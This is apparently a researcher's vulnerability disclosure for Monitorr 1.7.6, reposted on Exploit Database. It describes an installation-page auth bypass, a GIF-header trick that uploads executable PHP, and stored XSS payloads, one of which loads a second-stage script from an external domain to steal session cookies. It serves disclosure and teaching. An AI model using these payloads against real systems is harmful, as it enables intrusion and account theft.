# How White-Box hacking works: Authorization Bypass and Remote Code Execution in Monitorr 1.7.6

September 12, 2020
  |  [No Comments](https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/#respond)

Well, we pwned one more piece of software. Who cares? Nah, nobody. Alright, now user “nobody” – see how we did that.

Monitorr 1.7.6:

1. Was written on PHP, that is a good sign for us attackers.
2. Has 366 stars on Github.
3. Designed to do monitoring. We like this kind of software.

#### Auth Bypass

Classical situation – an attacker can access installation panel after the actual installation.

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-1.png)

Monitorr/assets/config/\_installation/\_register.php

Create a new user and authorize on behalf of this user.

#### Remote Code Execution

The vulnerable code resides in “upload.php” file. The only check that is done on the uploaded file is getimagesize() function:

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-2.png)

This function can be easily bypassed by prepending standard image properties to an executable file. In this example, a payload mimics a GIF image:

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-3.png)

After size check is passed, the file is successfully uploaded:

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-4.png)

So we can see our PHP code executed:

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-5.png)

It’s important to emphasize that no authentication checks are done in the upload.php script.

**Cross-Site Scripting (XSS)**

Two stored XSS have been found on service configuration tab at Monitorr settings page. Despite the length restriction, a malicious actor still can experience a full-feautered XSS attack by loading the second-stage payload from an external short domain like [14.rs](http://14.rs/) .

| Form field | Payload |
| --- | --- |
| Service URL | “`><payload><a href="` |
| Service Title | `<embed src=//14.rs>` |
| Service Image | “onerror=”alert(document.location) |

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-8.png)

Steps to Reproduce
1. Log in the application
2. Navigate to Service configuration tab
3. Enter the payload
4. Save changes and observe the javascript alert box triggered at the main Monitorr page.

By the way, session cookies don’t have HttpOnly flag, so we can steal authorization cookies.

![](https://lyhinslab.org/wp-content/uploads/2020/09/image-7.png)
#### Fix

Unfortunately, the Monitorr command decided to do not to fix these vulnerabilities. To do not have the same issues – ensure, that your software:

1. Deletes the installation files right after the installation.
2. Does input sanitization and output encoding of user input.
3. Checks file uploads properly.

*LL advises to all the researchers do not break real applications* *illegally. This fun leads to broken businesses and lives, and, most likely, will not make an attacker really rich.*

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
